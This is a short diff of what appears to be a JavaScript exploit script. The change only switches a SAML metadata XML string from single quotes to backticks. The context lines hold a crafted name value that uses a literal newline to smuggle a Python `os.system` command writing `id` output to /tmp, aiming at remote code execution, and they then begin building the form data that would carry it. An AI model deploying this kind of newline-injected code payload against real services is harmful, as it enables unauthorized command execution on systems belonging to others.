@@ -21,9 +21,9 @@
      // 2. The payload with the literal newline
      const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce.txt")`;
 
-     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+     const xml = `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
  protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
- Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';
+ Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`;
 
      // 3. Build the form data natively
      const formData = new FormData();
